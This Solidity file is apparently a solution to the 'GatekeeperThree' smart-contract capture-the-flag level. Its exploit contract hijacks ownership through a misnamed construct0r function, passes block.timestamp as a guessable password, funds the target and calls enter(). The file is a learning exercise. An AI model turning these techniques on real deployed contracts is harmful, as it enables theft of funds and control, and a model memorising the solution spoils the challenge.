// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./GatekeeperThree.sol";

function playerScript(address instanceAddress) {
    ////////// YOUR CODE GOES HERE //////////
    GatekeeperThreeExploit exploit = new GatekeeperThreeExploit(
        instanceAddress
    );
    exploit.execute{value: 0.001 ether + 1}();
    ////////// YOUR CODE END //////////
}

////////// YOUR CODE GOES HERE //////////
contract GatekeeperThreeExploit {
    GatekeeperThree gatekeeper;

    constructor(address instanceAddress) {
        gatekeeper = GatekeeperThree(payable(instanceAddress));
    }

    function execute() public payable {
        gatekeeper.construct0r();
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp);
        payable(address(gatekeeper)).transfer(0.001 ether + 1);
        gatekeeper.enter();
        console.log("Entrant: %s", gatekeeper.entrant());
    }
}
////////// YOUR CODE END //////////
